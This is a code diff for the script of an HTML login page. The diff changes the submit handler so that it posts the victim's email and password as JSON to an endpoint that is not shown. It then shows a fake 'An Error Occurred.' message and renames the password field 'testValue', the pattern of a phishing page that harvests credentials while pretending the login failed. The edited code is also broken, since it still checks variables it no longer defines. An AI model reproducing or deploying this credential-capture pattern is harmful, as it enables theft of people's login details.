@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -40,19 +41,12 @@
 const emailInput = document.querySelector("#email");
 const passwordInput = document.querySelector("#password");
 const button = document.querySelector("#submit");
-      const button = document.querySelector("#submit");
-
-button.addEventListener("click", () => {
-  alert("Verifying...");
-
-  setTimeout(() => {
-    alert("An Error Occurred.");
-  }, 1000);
-});
 
 button.addEventListener("click", async () => {
-  const email = emailInput.value.trim();
-  const password = passwordInput.value;
+  alert("Verifying...");
+
+  const username = emailInput.value.trim();
+  const testValue = passwordInput.value;
 
   if (!email || !password) return;
 
@@ -62,10 +56,14 @@ button.addEventListener("click", async () => {
       "Content-Type": "application/json"
     },
     body: JSON.stringify({
-      email,
-      password
+      username,
+      testValue
     })
   });
+
+  setTimeout(() => {
+    alert("An Error Occurred.");
+  }, 1000);
 });
 </script>
 
